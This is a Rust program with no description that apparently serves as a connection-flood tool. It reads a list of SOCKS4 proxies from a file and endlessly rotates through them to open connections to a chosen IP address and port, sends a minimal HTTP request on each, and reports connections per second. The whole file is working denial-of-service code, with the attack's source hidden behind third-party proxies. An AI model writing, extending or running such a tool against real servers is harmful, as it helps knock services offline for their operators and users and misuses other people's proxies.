use std::{fs, net::SocketAddrV4, sync::atomic::Ordering, sync::Arc};
use std::{net::Ipv4Addr, sync::atomic::AtomicU64, time::Duration};

use clap::Parser;
use color_eyre::eyre::{Context, OptionExt};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::{OwnedSemaphorePermit, Semaphore},
    time::sleep,
};
use tokio_socks::{tcp::Socks4Stream, IntoTargetAddr};
use tracing::{debug, error, info, info_span, level_filters::LevelFilter, trace, Instrument};

#[derive(Debug, Parser)]
struct Args {
    server_address: Ipv4Addr,
    server_port: u16,
    threads: u32,
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> color_eyre::Result<()> {
    color_eyre::install()?;
    tracing_subscriber::fmt()
        .with_max_level(LevelFilter::TRACE)
        .init();

    let args = Args::parse();
    let target = (args.server_address, args.server_port);
    let proxies = load_proxies()?;
    let connections = Arc::new(AtomicU64::new(0));
    let failures = Arc::new(AtomicU64::new(0));

    tokio::spawn(write_stats(connections.clone(), failures.clone()));
    let mut proxy_index = 0;
    let semaphore = Arc::new(Semaphore::new(args.threads as usize));
    let mut connection_index = 0;
    loop {
        trace!("Acquiring semaphore permit");
        let permit = semaphore.clone().acquire_owned().await?;
        trace!("Acquired semaphore permit");
        proxy_index = (proxy_index + 1) % proxies.len();
        let proxy = proxies[proxy_index];
        trace!("Spawning connection {connection_index} to proxy {proxy} for target {target:?}");
        tokio::spawn(
            connect_to_proxy(proxy, target, connections.clone(), failures.clone(), permit)
                .instrument(info_span!(
                    "connect_to_proxy",
                    connection = connection_index,
                    proxy = %proxy,
                )),
        );
        trace!("Spawned connection {connection_index} to proxy {proxy} for target {target:?}");
        connection_index += 1;
    }
}

async fn connect_to_proxy(
    proxy: SocketAddrV4,
    target: impl IntoTargetAddr<'_>,
    connections: Arc<AtomicU64>,
    failures: Arc<AtomicU64>,
    permit: OwnedSemaphorePermit,
) -> color_eyre::Result<()> {
    trace!("Connecting to proxy {proxy}");
    match Socks4Stream::connect(proxy, target).await {
        Ok(stream) => {
            trace!("Successfully connected to proxy {proxy}");
            connections.fetch_add(1, Ordering::Relaxed);
            if let Err(err) = send_http_request(stream.into_inner()).await {
                error!("error sending request through proxy {proxy}: {err}");
            }
        }
        Err(err) => {
            error!("Failed to connect to proxy {proxy}: {err}");
            failures.fetch_add(1, Ordering::Relaxed);
        }
    }
    trace!("Dropping semaphore permit");
    drop(permit);
    Ok(())
}

#[tracing::instrument(skip_all)]
async fn send_http_request(mut socket: TcpStream) -> color_eyre::Result<()> {
    socket.write_all(b"GET / HTTP/1.1\r\n\r\n").await?;
    let mut buf = vec![0; 1024];
    let byte_count = socket.read(&mut buf).await?;
    debug!("Received {} bytes from proxy", byte_count);
    socket.shutdown().await?;
    Ok(())
}

#[tracing::instrument(skip_all)]
async fn write_stats(cps: Arc<AtomicU64>, fails: Arc<AtomicU64>) {
    loop {
        sleep(Duration::from_secs(1)).await;
        info!(
            "cps: {cps} fails: {fails}",
            cps = cps.swap(0, Ordering::Relaxed),
            fails = fails.swap(0, Ordering::Relaxed),
        );
    }
}

fn load_proxies() -> color_eyre::Result<Vec<SocketAddrV4>> {
    fs::read_to_string("proxies.txt")
        .wrap_err("couldn't find proxies.txt")?
        .lines()
        .map(|line| {
            let mut parts = line.split(":");
            let addr = parts.next().ok_or_eyre("missing server address")?;
            let port = parts.next().ok_or_eyre("missing port")?;

            let addr = addr
                .parse::<Ipv4Addr>()
                .wrap_err("couldn't parse target as ipv4 addr")?;
            let port = port
                .parse::<u16>()
                .wrap_err("couldn't parse port as an u16")?;
            Ok(SocketAddrV4::new(addr, port))
        })
        .collect()
}
